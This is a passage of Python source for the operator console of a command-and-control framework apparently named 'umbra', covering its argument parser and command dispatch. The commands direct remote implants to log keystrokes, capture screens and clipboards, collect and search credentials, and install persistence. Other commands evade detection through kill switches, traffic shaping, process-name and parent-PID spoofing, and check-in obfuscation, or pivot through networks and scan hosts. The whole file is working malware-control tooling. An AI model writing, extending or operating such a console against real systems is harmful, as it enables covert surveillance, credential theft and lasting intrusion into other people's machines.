    evade_profile.add_argument("--busy-end", type=int, default=0, help="the last working hour")
    evade_profile.add_argument("--busy-factor", type=int, default=0)
    evade_profile.add_argument("--night-factor", type=int, default=0)
    evade_profile.add_argument("--weekend-factor", type=int, default=0)
    evade_profile.add_argument("--wait", action="store_true")
    evade_profile.add_argument("--timeout", type=float, default=120.0)
    evade_profile.add_argument("--json", action="store_true")

    evade_shape = sub.add_parser("evade-shape", help="the shape of the traffic")
    evade_shape.add_argument("agent")
    evade_shape.add_argument("--mode", default="", help="off, random or fixed")
    evade_shape.add_argument("--size", type=int, default=0, help="the size of the frames")
    evade_shape.add_argument("--pad-every", type=int, default=0)
    evade_shape.add_argument("--reorder", dest="reorder", action="store_true", default=None,
                             help="shuffle the tasks inside a cycle")
    evade_shape.add_argument("--no-reorder", dest="reorder", action="store_false")
    evade_shape.add_argument("--wait", action="store_true")
    evade_shape.add_argument("--timeout", type=float, default=120.0)
    evade_shape.add_argument("--json", action="store_true")

    evade_kill = sub.add_parser("evade-killswitch",
                                help="the moment the implant stops existing")
    evade_kill.add_argument("agent")
    evade_kill.add_argument("--file", default="", help="the implant stops when this file appears")
    evade_kill.add_argument("--registry", default="", help="HKLM\\KEY\\VALUE")
    evade_kill.add_argument("--at", type=int, default=0, help="a unix timestamp")
    evade_kill.add_argument("--uptime", type=int, default=0, help="hours of uptime")
    evade_kill.add_argument("--marker", default="", help="the operator sends this marker")
    evade_kill.add_argument("--note", default="")
    evade_kill.add_argument("--clear", action="store_true")
    evade_kill.add_argument("--wait", action="store_true")
    evade_kill.add_argument("--timeout", type=float, default=120.0)
    evade_kill.add_argument("--json", action="store_true")

    hygiene = sub.add_parser("hygiene", help="the memory and the process hygiene")
    hygiene.add_argument("agent")
    hygiene.add_argument("--memory", action="store_true", help="the memory report")
    hygiene.add_argument("--copy", default="", help="copy the implant to this path")
    hygiene.add_argument("--name", default="", help="the name the process reports")
    hygiene.add_argument("--cwd", default="", help="the working directory of the process")
    hygiene.add_argument("--clean-env", action="store_true",
                         help="remove the tool from the environment")
    hygiene.add_argument("--ppid", type=int, default=0,
                         help="the parent the process claims to have")
    hygiene.add_argument("--wait", action="store_true")
    hygiene.add_argument("--timeout", type=float, default=120.0)
    hygiene.add_argument("--json", action="store_true")

    update = sub.add_parser("update", help="replace the running implant")
    update.add_argument("agent")
    update.add_argument("path", help="the new binary on the target")
    update.add_argument("--sha256", default="", help="the expected digest of the new binary")
    update.add_argument("--wait", action="store_true")
    update.add_argument("--timeout", type=float, default=120.0)

    keylog_cmd = sub.add_parser("keylog-file", help="write the keys into a file on an agent")
    keylog_cmd.add_argument("agent")
    keylog_cmd.add_argument("path", nargs="?", default="umbra-keys.log")
    keylog_cmd.add_argument("--seconds", type=int, default=300)
    keylog_cmd.add_argument("--wait", action="store_true")
    keylog_cmd.add_argument("--timeout", type=float, default=120.0)

    tail_cmd = sub.add_parser("tail", help="the last lines of a file on an agent")
    tail_cmd.add_argument("agent")
    tail_cmd.add_argument("path")
    tail_cmd.add_argument("--lines", type=int, default=20)
    tail_cmd.add_argument("--wait", action="store_true")
    tail_cmd.add_argument("--timeout", type=float, default=120.0)

    hash_cmd = sub.add_parser("hash", help="the SHA-256 of a file on an agent")
    hash_cmd.add_argument("agent")
    hash_cmd.add_argument("path")
    hash_cmd.add_argument("--wait", action="store_true")
    hash_cmd.add_argument("--timeout", type=float, default=120.0)

    reg = sub.add_parser("registry", help="the Windows registry of an agent")
    reg.add_argument("agent")
    reg.add_argument("key", help="the key, for example SOFTWARE\\Microsoft")
    reg.add_argument("--hive", default="HKLM", help="HKLM, HKCU, HKCR or HKU")
    reg.add_argument("--value", default="", help="read one value instead of the whole key")
    reg.add_argument("--wait", action="store_true")
    reg.add_argument("--timeout", type=float, default=120.0)

    procs = sub.add_parser("proc", help="the process table of an agent")
    procs.add_argument("agent")
    procs.add_argument("--wait", action="store_true")
    procs.add_argument("--timeout", type=float, default=120.0)

    prockill = sub.add_parser("proc-kill", help="terminate a process on an agent")
    prockill.add_argument("agent")
    prockill.add_argument("target", help="the pid or the name of the process")
    prockill.add_argument("--wait", action="store_true")
    prockill.add_argument("--timeout", type=float, default=120.0)

    report = sub.add_parser("report", help="write a report about one agent")
    report.add_argument("agent", nargs="?", default="")
    report.add_argument("--all", action="store_true", help="the whole engagement")
    report.add_argument("--limit", type=int, default=50)
    report.add_argument("--out", default="", help="write the report to this file")

    browse = sub.add_parser("browse", help="list the files under a path on an agent")
    browse.add_argument("agent")
    browse.add_argument("path", nargs="?", default=".")
    browse.add_argument("--max", type=int, default=500)
    browse.add_argument("--wait", action="store_true")
    browse.add_argument("--timeout", type=float, default=300.0)

    # -- the operator's own desktop ---------------------------------------
    shot = sub.add_parser("screenshot", help="capture the screen of an agent")
    shot.add_argument("agent")
    shot.add_argument("file", nargs="?", default="", help="where to write the png")
    shot.add_argument("--timeout", type=float, default=120.0)

    clip = sub.add_parser("clipboard", help="read the clipboard of an agent")
    clip.add_argument("agent")
    clip.add_argument("--wait", action="store_true")
    clip.add_argument("--timeout", type=float, default=120.0)

    # -- file triage and search -------------------------------------------
    triage = sub.add_parser("triage", help="triage a file on an agent")
    triage.add_argument("agent")
    triage.add_argument("path")
    triage.add_argument("--wait", action="store_true")
    triage.add_argument("--timeout", type=float, default=120.0)

    find = sub.add_parser("find", help="search for files on an agent")
    find.add_argument("agent")
    find.add_argument("name", nargs="?", default="", help="the name filter (a glob or a substring)")
    find.add_argument("--content", default="", help="also look for this text in the files")
    find.add_argument("--path", default=".", help="where to start the search")
    find.add_argument("--max", type=int, default=200)
    find.add_argument("--wait", action="store_true")
    find.add_argument("--timeout", type=float, default=300.0)

    netinfo = sub.add_parser("netinfo", help="the network configuration of an agent")
    netinfo.add_argument("agent")
    netinfo.add_argument("--wait", action="store_true")
    netinfo.add_argument("--timeout", type=float, default=120.0)

    # -- beacon policy ----------------------------------------------------
    policy = sub.add_parser("policy", help="push the cadence to one or many agents")
    policy.add_argument("agent", nargs="?", default="", help="agent id")
    policy.add_argument("--all", action="store_true",
                        help="every agent that matches the filters")
    policy.add_argument("--sleep", type=int, default=0, help="check-in interval in seconds")
    policy.add_argument("--jitter", type=int, default=0, help="jitter in percent")
    policy.add_argument("--obfuscate", dest="obfuscate", action="store_true", default=None,
                        help="hide the check-in pattern (the default)")
    policy.add_argument("--no-obfuscate", dest="obfuscate", action="store_false",
                        help="keep a fixed check-in interval")
    policy.add_argument("--state", default="", help="filter: online or offline")
    policy.add_argument("--tag", default="", help="filter: agents carrying this tag")

    tag = sub.add_parser("tag", help="label agents")
    tag.add_argument("agent", nargs="?", default="", help="agent id")
    tag.add_argument("labels", nargs="*", help="the tags to apply")
    tag.add_argument("--remove", action="store_true", help="remove the tags instead")
    tag.add_argument("--set", dest="replace", action="store_true",
                     help="replace every tag of the agent")
    tag.add_argument("--state", default="", help="filter: online or offline")
    tag.add_argument("--match", default="", help="filter: agents carrying this tag")

    # -- the server-side file store ---------------------------------------
    artifact = sub.add_parser("artifact", help="the team server's file store")
    artifact.add_argument("action", choices=["list", "put", "get", "remove", "push"],
                          help="what to do with the store")
    artifact.add_argument("name", nargs="?", default="", help="artifact name")
    artifact.add_argument("agent", nargs="?", default="", help="agent id (push)")
    artifact.add_argument("--file", default="", help="the local file (put, get)")
    artifact.add_argument("--path", default="", help="the path on the agent (push)")

    # -- network reach and the local environment ---------------------------
    scan = sub.add_parser("scan", help="scan a range of hosts for open ports")
    scan.add_argument("agent")
    scan.add_argument("target", help="an address or a CIDR block")
    scan.add_argument("--ports", default="22,80,443", help="the ports to try")
    scan.add_argument("--timeout-ms", dest="timeout_ms", type=int, default=800,
                      help="how long a single connect may take")
    scan.add_argument("--wait", action="store_true")
    scan.add_argument("--timeout", type=float, default=300.0)

    resolve = sub.add_parser("resolve", help="resolve a name on an agent")
    resolve.add_argument("agent")
    resolve.add_argument("host")
    resolve.add_argument("--port", type=int, default=0)
    resolve.add_argument("--wait", action="store_true")
    resolve.add_argument("--timeout", type=float, default=120.0)

    env = sub.add_parser("env", help="the environment of an agent")
    env.add_argument("agent")
    env.add_argument("--filter", default="",
                     help="only the variables whose name contains this")
    env.add_argument("--wait", action="store_true")
    env.add_argument("--timeout", type=float, default=120.0)

    touch = sub.add_parser("touch", help="create a file on an agent and stamp it")
    touch.add_argument("agent")
    touch.add_argument("path")
    touch.add_argument("--wait", action="store_true")
    touch.add_argument("--timeout", type=float, default=120.0)

    # -- burning an engagement ---------------------------------------------
    panic = sub.add_parser("panic", help="tell the beacons to exit and stop their work")
    panic.add_argument("agent", nargs="?", default="", help="agent id")
    panic.add_argument("--all", action="store_true",
                       help="every agent the server knows, sleeping ones included")
    panic.add_argument("--yes", action="store_true", help="do not ask")

    # -- local state ------------------------------------------------------
    dbcmd = sub.add_parser("db", help="the console's local state database (SQLite)")
    dbcmd.add_argument("action", choices=[
        "stats", "tasks", "results", "notes", "search", "note", "export"])
    dbcmd.add_argument("value", nargs="?", default="",
                       help="agent id, task id or search term (depends on the action)")
    dbcmd.add_argument("--limit", type=int, default=50)
    dbcmd.add_argument("--out", default="", help="output file for `db export`")
    dbcmd.add_argument("--agent", default="", help="agent id for `db note`")

    return p


def main(argv: Optional[List[str]] = None) -> int:
    args = build_parser().parse_args(argv)
    if args.cmd == "db":
        # The notebook is local: it works without a server or a token.
        return run_db_command(args)
    token = read_token(args)

    def on_event(ev: Dict[str, Any]) -> None:
        if args.watch:
            # Events arrive asynchronously; keep them off stdout so a piped
            # command's output is not corrupted.
            print_event(ev, stream=sys.stderr)

    client = OperatorClient(
        args.server,
        token,
        args.operator,
        timeout=args.timeout,
        on_event=on_event,
        tls=args.tls,
        tls_ca=args.tls_ca,
        tls_server_name=args.tls_server_name,
        tls_cert=args.tls_cert,
        tls_key=args.tls_key,
    )
    try:
        client.connect()
    except (OperatorError, crypto.AeadError, netio.StreamError, OSError) as exc:
        # A refused connection, a closed socket mid-handshake or a bad token all
        # land here; print one line instead of a traceback.
        print(f"connection failed: {exc}", file=sys.stderr)
        return 2

    # The local notebook: optional, and never fatal.
    store = open_state(args.db)
    console = Console(client, watch=args.watch, store=store)
    if store is not None:
        try:
            console.session = store.start_session(
                args.operator, args.server, client.session_id.hex())
        except Exception:  # noqa: BLE001 - the console works without a notebook
            console.session = 0
    try:
        if not args.quiet:
            # stderr, not stdout: `umbra tasks | jq` must receive pure data.
            print(f"connected to {args.server} as {args.operator} "
                  f"(session {client.session_id.hex()[:12]}…)",
                  file=sys.stderr)

        if args.cmd is None:
            # interactive shell
            print(BANNER)
            while True:
                try:
                    prompt = f"umbra[{console.current_agent or '-'}]> "
                    line = input(prompt)
                except (EOFError, KeyboardInterrupt):
                    print()
                    break
                if not console.run_command(line):
                    break
            return 0

        if args.cmd == "agents":
            rows = client.agents(
                state=args.state, transport=args.transport, os=args.os,
                arch=args.arch, tag=args.tag, user=args.user,
            )
            emit(rows) if args.json else print_agents(rows)
        elif args.cmd == "whoami":
            data = client.whoami()
            emit(data) if args.json else print_whoami(data)
        elif args.cmd == "chat":
            if args.message:
                text = " ".join(args.message).strip()
                to = args.to
                # `chat @bob hello` is the same as `chat --to bob hello`.
                if not to and text.startswith("@"):
                    head, _, rest = text[1:].partition(" ")
                    if head and rest.strip():
                        to, text = head, rest.strip()
                data = client.say(text, to)
                if args.json:
                    emit({"sent": text, **({"to": to} if to else {})})
                else:
                    print(f"sent: {text}" + (f" -> {to}" if to else ""))
            else:
                messages = client.chat_history(args.limit)
                emit(messages) if args.json else print_chat(messages)
        elif args.cmd == "schedule":
            if args.action == "list":
                rows = client.schedules()
                emit(rows) if args.json else print_schedules(rows)
            elif args.action == "add":
                if not args.target or not args.kind:
                    print("usage: umbra schedule add <agent> <kind> [--every N] [--args JSON]",
                          file=sys.stderr)
                    return 2
                try:
                    task_args = json.loads(args.args)
                except json.JSONDecodeError as exc:
                    print(f"invalid --args json: {exc}", file=sys.stderr)
                    return 2
                if not isinstance(task_args, dict):
                    print("--args must be a JSON object", file=sys.stderr)
                    return 2
                # The key=value form is for the arguments an operator types
                # every time; the JSON form is for the rest.
                for pair in args.arg:
                    if "=" not in pair:
                        print(f"invalid --arg {pair!r}: use key=value", file=sys.stderr)
                        return 2
                    key, _, value = pair.partition("=")
                    task_args.setdefault(key.strip(), value.strip())
                data = client.add_schedule(args.target, args.kind, args.every, task_args)
                emit(data) if args.json else print(
                    f"scheduled {data['schedule_id']} ({args.kind} every {args.every}s on {args.target})"
                )
            else:
                if not args.target:
                    print("usage: umbra schedule rm <schedule-id>", file=sys.stderr)
                    return 2
                client.remove_schedule(args.target)
                emit({"schedule_id": args.target, "removed": True}) if args.json else print(
                    f"removed {args.target}"
                )
        elif args.cmd == "focus":
            data = client.focus(args.agent)
            if args.json:
                emit(data)
            elif args.agent:
                print(f"focus: {args.agent}")
            else:
                print("focus cleared")
        elif args.cmd == "claim":
            data = client.claim(args.task_id)
            emit(data) if args.json else print(f"claimed {args.task_id} ({data.get('state', '?')})")
        elif args.cmd == "release":
            data = client.release(args.task_id)
            if args.json:
                emit(data)
            else:
                print(f"released {args.task_id}" if not data.get("claimed_by")
                      else f"still claimed by {data['claimed_by']}")
        elif args.cmd == "operators":
            rows = client.operators()
            emit(rows) if args.json else print_operators(rows)
        elif args.cmd == "stats":
            emit(client.stats())
        elif args.cmd == "audit":
            payload = client.audit(args.limit)
            if args.json:
                emit(payload)
            else:
                print_audit(payload)
        elif args.cmd == "info":
            emit(client.agent_info(args.agent))
        elif args.cmd == "run":
            command = " ".join(args.command).strip()
            if not command:
                print("no command given", file=sys.stderr)
                return 2
            task_id = client.submit(args.agent, "shell", {"cmd": command})
            console.note_task(task_id, args.agent, "shell", {"cmd": command})
            if args.json and not args.wait:
                emit({"task_id": task_id, "agent": args.agent, "kind": "shell"})
            else:
                print(f"queued {task_id}")
            if args.wait:
                result = client.wait_for_result(task_id, timeout=args.timeout)
                console.note_result(task_id, result)
                emit(result) if args.json else print_task_result(result)
        elif args.cmd == "task":
            try:
                task_args = json.loads(args.args)
            except json.JSONDecodeError as exc:
                print(f"invalid --args json: {exc}", file=sys.stderr)
                return 2
            kind = args.kind_flag or args.kind
            if not kind:
                print("no task kind given", file=sys.stderr)
                return 2
            bulk_agents = [a.strip() for a in args.agents.split(",") if a.strip()]
            bulk_filter = parse_filter(args.filter)
            if bulk_agents or bulk_filter:
                # The bulk path: one task, many agents.
                rows = client.submit_bulk(kind, task_args,
                                          agents=bulk_agents or None, **bulk_filter)
                for row in rows:
                    console.note_task(str(row.get("task_id", "")), str(row.get("agent_id", "")),
                                      kind, task_args)
                if args.json:
                    emit({"tasks": rows, "count": len(rows)})
                else:
                    print(f"queued {len(rows)} task(s) of kind {kind}")
                    for row in rows:
                        print(f"  {row.get('agent_id', '?')} -> {row.get('task_id', '?')}")
                return 0
            if not args.agent:
                print("no agent given", file=sys.stderr)
                return 2
            task_id = client.submit(args.agent, kind, task_args)
            console.note_task(task_id, args.agent, kind, task_args)
            if args.json and not args.wait:
                emit({"task_id": task_id, "agent": args.agent, "kind": kind})
            else:
                print(f"queued {task_id}")
            if args.wait:
                result = client.wait_for_result(task_id, timeout=args.timeout)
                console.note_result(task_id, result)
                emit(result) if args.json else print_task_result(result)
        elif args.cmd in ("download", "upload"):
            chunk = args.chunk or CHUNK_MAX
            if chunk < 1 or chunk > CHUNK_MAX:
                print(f"--chunk must be between 1 and {CHUNK_MAX}", file=sys.stderr)
                return 2
            bar = None if args.json else _progress_printer()

            def note(done: int, total: int) -> None:
                if bar is not None:
                    bar(done, total)

            if args.cmd == "download":
                info = client.download_file(
                    args.agent, args.remote, args.local,
                    timeout=args.timeout, chunk=chunk, progress=note,
                )
            else:
                info = client.upload_file(
                    args.agent, args.local, args.remote,
                    timeout=args.timeout, chunk=chunk, progress=note,
                )
            if bar is not None:
                bar(info["bytes"], info["bytes"], final=True)
            emit(info) if args.json else print(
                f"{args.cmd} {info['path']} {info['bytes']} bytes in {info['chunks']} chunk(s)"
                f" sha256={info['sha256'][:16]}…"
            )
        elif args.cmd == "tasks":
            rows = client.tasks(args.agent, args.limit, kind=args.kind, state=args.state)
            emit(rows) if args.json else print_tasks(rows)
        elif args.cmd == "result":
            task = client.task(args.task_id)
            # Collecting the output is part of the history: it belongs in the
            # notebook as much as the submission does.
            console.note_result(args.task_id, task)
            if args.out:
                # The output of a task is often a file: a digest list, a
                # dump, a log.  Writing it to a file keeps it whole.
                out = task.get("out", b"")
                if isinstance(out, str):
                    out = out.encode()
                with open(args.out, "wb") as fh:
                    fh.write(out)
                if args.json:
                    emit({"task_id": args.task_id, "file": args.out,
                          "bytes": len(out)})
                else:
                    print(f"wrote {args.out} ({len(out)} bytes)")
                return 0 if task.get("state") == "done" and not task.get("code") else 1
            if args.json:
                emit(task)
                # A failed task must fail the shell too, so scripts can branch
                # on the exit status instead of parsing output.
                return 0 if task.get("state") == "done" and not task.get("code") else 1
            print_task_result(task)
        elif args.cmd == "retry":
            res = client.retry(args.task_id)
            if args.json:
                print(json.dumps(res, indent=2, sort_keys=True))
            else:
                console.print(f"[green]queued[/] {res.get('task_id')} "
                              f"(the task {args.task_id} is retried)")
        elif args.cmd == "cancel":
            client.cancel(args.task_id)
            if args.json:
                emit({"task_id": args.task_id, "state": "cancelled"})
            else:
                print(f"cancelled {args.task_id}")
        elif args.cmd == "wipe":
            # The end of an engagement.  The implants are not touched, so
            # the operator is asked twice.
            if not args.yes:
                print("this clears the agents, the tasks and the schedules "
                      "of the server.")
                print("the implants keep running; remove them first.")
                answer = input("type 'wipe' to continue: ").strip()
                if answer != "wipe":
                    print("nothing was changed")
                    return 0
            res = client.wipe()
            if args.json:
                emit(res)
            else:
                print(f"removed {res.get('agents', 0)} agents, "
                      f"{res.get('tasks', 0)} tasks and "
                      f"{res.get('schedules', 0)} schedules")
        elif args.cmd == "panic":
            # The end of an engagement on the target side.  The beacons are
            # told to exit and the server stops feeding them, so the
            # operator is asked twice.
            if not args.yes:
                print("this tells the selected beacons to exit and stops "
                      "the server from queueing any more work for them.")
                print("the implants that are asleep get the command on "
                      "their next check-in.")
                try:
                    answer = input("type 'panic' to continue: ").strip()
                except (EOFError, KeyboardInterrupt):
                    print()
                    print("nothing was changed")
                    return 0
                if answer != "panic":
                    print("nothing was changed")
                    return 0
            res = client.panic([args.agent] if args.agent else None, args.all)
            if args.json:
                emit(res)
            else:
                print(f"panicked {res.get('count', 0)} agents")
                for agent_id in res.get("panicked", []):
                    print(f"  {agent_id}")
        elif args.cmd == "artifact":
            if args.action == "list":
                rows = client.artifact_list()
                if args.json:
                    emit(rows)
                else:
                    print_artifacts(rows)
            elif args.action == "put":
                if not args.file:
                    print("artifact put needs --file", file=sys.stderr)
                    return 2
                # Without a name the file keeps its own.
                name = args.name or os.path.basename(args.file)
                info = client.artifact_upload(name, args.file)
                if args.json:
                    emit(info)
                else:
                    print(f"stored {info.get('name')} "
                          f"({info.get('size')} bytes, "
                          f"sha256 {info.get('sha256')})")
            elif args.action == "get":
                if not args.file:
                    print("artifact get needs --file", file=sys.stderr)
                    return 2
                info = client.artifact_download(args.name, args.file)
                if args.json:
                    emit(info)
                else:
                    print(f"wrote {info.get('bytes')} bytes to "
                          f"{info.get('local')}")
            elif args.action == "remove":
                info = client.artifact_remove(args.name)
                if args.json:
                    emit(info)
                else:
                    print(f"removed {args.name}")
            elif args.action == "push":
                info = client.artifact_push(args.name, args.agent, args.path)
                if args.json:
                    emit(info)
                else:
                    print(f"pushing {args.name} to {args.agent} "
                          f"({info.get('stages')} chunks, "
                          f"{info.get('size')} bytes)")
        elif args.cmd == "scan":
            run_task_and_wait(client, console, args.agent, "scan", {
                "host": args.target,
                "ports": args.ports,
                "timeout_ms": args.timeout_ms,
            }, args.wait, args.timeout, args.json)
        elif args.cmd == "resolve":
            run_task_and_wait(client, console, args.agent, "resolve", {
                "host": args.host,
                "port": args.port,
            }, args.wait, args.timeout, args.json)
        elif args.cmd == "env":
            run_task_and_wait(client, console, args.agent, "env", {
                "filter": args.filter,
            }, args.wait, args.timeout, args.json)
        elif args.cmd == "touch":
            run_task_and_wait(client, console, args.agent, "touch", {
                "path": args.path,
            }, args.wait, args.timeout, args.json)
        elif args.cmd == "sessions":
            rows = client.sessions()
            if args.json:
                emit(rows)
            else:
                print_sessions(rows)
        elif args.cmd == "events":
            res = client.events(args.after, args.limit)
            rows = res.get("events") or []
            if args.kind:
                rows = [e for e in rows if e.get("kind") == args.kind]
            if args.agent:
                rows = [e for e in rows if e.get("agent_id") == args.agent]
            if args.json:
                emit(rows)
            else:
                print_events(rows)
        elif args.cmd == "watch":
            return watch_events(client, args.limit, as_json=args.json)
        elif args.cmd == "sleep":
            client.set_sleep(args.agent, args.seconds, args.jitter)
            if args.json:
                emit({"agent": args.agent, "sleep": args.seconds, "jitter": args.jitter})
            else:
                print("beacon policy updated")
        elif args.cmd == "kill":
            res = client.rpc("agents.kill", {"id": args.agent})
            print("kill task queued" if res.ok else f"error: {res.error}")
        elif args.cmd == "pivot":
            if args.action == "list":
                tunnels = client.pivot_list()
                sessions = client.pivot_sessions()
                topology = client.pivot_topology()
                if args.json:
                    emit({"tunnels": tunnels, "sessions": sessions,
                          "topology": topology})
                else:
                    print_pivots(tunnels, sessions, topology)
            elif args.action == "open":
                if not args.target:
                    print("usage: umbra pivot open <agent> [--mode socks|forward] "
                          "[--host H --port P] [--listen ADDR] [--dns remote|local] "
                          "[--loopback] [--claim NAME] [--through AGENT ...]",
                          file=sys.stderr)
                    return 2
                data = client.pivot_open(
                    args.target,
                    mode=args.mode,
                    host=args.host,
                    port=args.port,
                    listen=args.listen,
                    dns=args.dns,
                    loopback=args.loopback,
                    claim=args.claim,
                    through=args.through[0] if args.through else "",
                    user=args.user,
                    password=args.password,
                    path=list(args.through),
                )
                if args.json:
                    emit(data)
                else:
                    print(f"pivot {data.get('stream')} open on {data.get('listen')} "
                          f"via {data.get('agent_id')} ({data.get('mode')})")
                    if data.get("claim"):
                        print(f"  claim {data.get('claim')}")
            elif args.action == "claims":
                claims = client.pivot_claims()
                if args.json:
                    emit({"claims": claims})
                elif not claims:
                    print("no claim is held")
                else:
                    for claim in claims:
                        print(f"{claim.get('claim')}: "
                              f"{', '.join(claim.get('tunnels') or [])}")
            elif args.action == "release":
                if not args.target:
                    print("usage: umbra pivot release <claim>", file=sys.stderr)
                    return 2
                closed = client.pivot_release(args.target)
                if args.json:
                    emit({"claim": args.target, "closed": closed})
                else:
                    print(f"released {args.target}: {len(closed)} pivots torn down")
            else:
                if not args.target:
                    print("usage: umbra pivot close <tunnel-id>", file=sys.stderr)
                    return 2
                client.pivot_close(args.target)
                if args.json:
                    emit({"stream": args.target, "closed": True})
                else:
                    print(f"closed {args.target}")
        elif args.cmd == "transport":
            if args.action == "list":
                routes = client.transport_list()
                if args.json:
                    emit({"routes": routes})
                else:
                    rows = [
                        [
                            r.get("agent", "?"),
                            r.get("primary", "?"),
                            ",".join(r.get("fallback") or []) or "-",
                            r.get("front", "") or "-",
                            "yes" if r.get("inspect") else "no",
                        ]
                        for r in routes
                    ]
                    print(_table(
                        ["AGENT", "PRIMARY", "FALLBACK", "FRONT", "INSPECT"], rows))
            elif args.action == "get":
                if not args.target:
                    print("usage: umbra transport get <agent>", file=sys.stderr)
                    return 2
                route = client.transport_get(args.target)
                if args.json:
                    emit(route)
                else:
                    print(f"{route.get('agent')} speaks {route.get('primary')}"
                          f" (fallback: {', '.join(route.get('fallback') or []) or '-'})"
                          + (f", front {route.get('front')}" if route.get("front") else ""))
            else:
                if not args.target or not args.primary:
                    print("usage: umbra transport set <agent> --primary <transport> "
                          "[--fallback tcp,ws] [--front domain] [--inspect]",
                          file=sys.stderr)
                    return 2
                fallback = [f.strip() for f in args.fallback.split(",") if f.strip()]
                route = client.transport_set(
                    args.target,
                    primary=args.primary,
                    fallback=fallback,
                    front=args.front,
                    inspect=args.inspect,
                    http_path=args.http_path,
                    ws_path=args.ws_path,
                )
                if args.json:
                    emit(route)
                else:
                    print(f"{route.get('agent')} now speaks {route.get('primary')}"
                          f" (fallback: {', '.join(route.get('fallback') or []) or '-'})")
        elif args.cmd == "vpn":
            if args.action == "status":
                status = client.vpn_status()
                emit(status) if args.json else print_vpn_status(status)
            elif args.action == "peers":
                peers = client.vpn_peers()
                emit(peers) if args.json else print_vpn_peers(peers)
            else:
                if not args.target:
                    print("usage: umbra vpn allocate <agent>", file=sys.stderr)
                    return 2
                address = client.vpn_allocate(args.target)
                if args.json:
                    emit({"id": args.target, "address": address})
                else:
                    print(f"{args.target} -> {address}")
        elif args.cmd == "armory":
            if args.action == "list":
                data = client.armory_list()
                if args.json:
                    emit(data)
                else:
                    print_armory(data)
            elif args.action == "install":
                if not args.name:
                    print("usage: umbra armory install <name>", file=sys.stderr)
                    return 2
                data = client.armory_install(args.name)
                if args.json:
                    emit(data)
                else:
                    print(f"installed {data.get('name')} ({data.get('size')} bytes)")
            elif args.action == "remove":
                if not args.name:
                    print("usage: umbra armory remove <name>", file=sys.stderr)
                    return 2
                client.armory_remove(args.name)
                if args.json:
                    emit({"name": args.name, "removed": True})
                else:
                    print(f"removed {args.name}")
            else:
                if not args.name or not args.agent:
                    print("usage: umbra armory run <name> <agent> [--args JSON]", file=sys.stderr)
                    return 2
                try:
                    task_args = json.loads(args.args)
                except json.JSONDecodeError as exc:
                    print(f"invalid --args json: {exc}", file=sys.stderr)
                    return 2
                task_id = client.armory_run(args.name, args.agent, task_args)
                console.note_task(task_id, args.agent, f"armory:{args.name}", task_args)
                if args.json:
                    emit({"task_id": task_id, "name": args.name, "agent": args.agent})
                else:
                    print(f"queued {task_id} ({args.name} on {args.agent})")
        elif args.cmd == "alias":
            if args.action == "list":
                aliases = client.alias_list()
                if args.json:
                    emit(aliases)
                else:
                    print_aliases(aliases)
            else:
                if not args.name or not args.agent:
                    print("usage: umbra alias run <name> <agent> [--args JSON]", file=sys.stderr)
                    return 2
                try:
                    task_args = json.loads(args.args)
                except json.JSONDecodeError as exc:
                    print(f"invalid --args json: {exc}", file=sys.stderr)
                    return 2
                task_id = client.alias_run(args.name, args.agent, task_args)
                console.note_task(task_id, args.agent, f"alias:{args.name}", task_args)
                if args.json:
                    emit({"task_id": task_id, "name": args.name, "agent": args.agent})
                else:
                    print(f"queued {task_id} ({args.name} on {args.agent})")
        elif args.cmd == "session":
            opened = client.open_session(args.agent, args.shell_cmd)
            task_id = str(opened.get("task_id", ""))
            console.note_task(task_id, args.agent, "session.open", {"cmd": args.shell_cmd})
            if args.json:
                emit(opened)
            else:
                print(f"session task {task_id} queued")
            if args.input_text:
                session_id = wait_for_session_id(client, task_id, args.timeout)
                if session_id:
                    client.session_input(args.agent, session_id,
                                         (args.input_text + "\n").encode())
                result = client.wait_for_result(task_id, timeout=args.timeout)
                console.note_result(task_id, result)
                emit(result) if args.json else print_task_result(result)
            elif not args.json:
                stream_session(client, console, args.agent, task_id, args.timeout)
        elif args.cmd == "chain":
            try:
                stages = json.loads(args.stages)
            except json.JSONDecodeError as exc:
                print(f"invalid --stages json: {exc}", file=sys.stderr)
                return 2
            if not isinstance(stages, list) or not stages:
                print("a chain needs at least one stage", file=sys.stderr)
                return 2
            data = client.submit_chain(args.agent, stages)
            task_id = str(data.get("task_id", ""))
            console.note_task(task_id, args.agent, "chain", {"stages": stages})
            if args.json:
                emit(data)
            else:
                print(f"chain {data.get('chain_id', '?')} queued ({len(stages)} stages)")
            if args.wait and task_id:
                result = client.wait_for_result(task_id, timeout=args.timeout)
                console.note_result(task_id, result)
                emit(result) if args.json else print_task_result(result)
        elif args.cmd == "alerts":
            rows = client.alerts()
            emit(rows) if args.json else print_alerts(rows)
        elif args.cmd == "screenshot":
            task_id = client.submit(args.agent, "screenshot", {})
            console.note_task(task_id, args.agent, "screenshot", {})
            result = client.wait_for_result(task_id, timeout=args.timeout)
            console.note_result(task_id, result)
            raw = result.get("out", b"")
            if isinstance(raw, str):
                raw = raw.encode()
            if not raw:
                print("the agent returned no image", file=sys.stderr)
                return 1
            try:
                png = image.bmp_to_png(bytes(raw))
            except ValueError as exc:
                print(f"the image could not be converted: {exc}", file=sys.stderr)
                return 1
            target = args.file or f"screenshot-{args.agent}.png"
            with open(target, "wb") as handle:
                handle.write(png)
            if args.json:
                emit({"task_id": task_id, "agent": args.agent, "file": target,
                      "bytes": len(png)})
            else:
                print(f"{target} ({len(png)} bytes)")
        elif args.cmd == "clipboard":
            run_task_and_wait(client, console, args.agent, "clipboard", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "persist":
            run_task_and_wait(client, console, args.agent, "persist",
                              {"method": args.method, "name": args.name,
                               "silent": args.silent, "verify": args.verify},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "unpersist":
            run_task_and_wait(client, console, args.agent, "unpersist",
                              {"method": args.method},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "persist-list":
            run_task_and_wait(client, console, args.agent, "persist.list", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "persist-verify":
            run_task_and_wait(client, console, args.agent, "persist.verify", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "persist-migrate":
            run_task_and_wait(client, console, args.agent, "persist.migrate",
                              {"from": args.source, "to": args.target},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "persist-health":
            run_task_and_wait(client, console, args.agent, "persist.health", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "persist-report":
            print_persistence(client.persistence_report(args.agent), args.json)
        elif args.cmd == "creds-list":
            print_credentials(
                client.creds_list(args.agent, args.kind, args.query),
                args.json)
        elif args.cmd == "creds-search":
            print_credentials(
                client.creds_search(args.query, args.kind, args.agent),
                args.json)
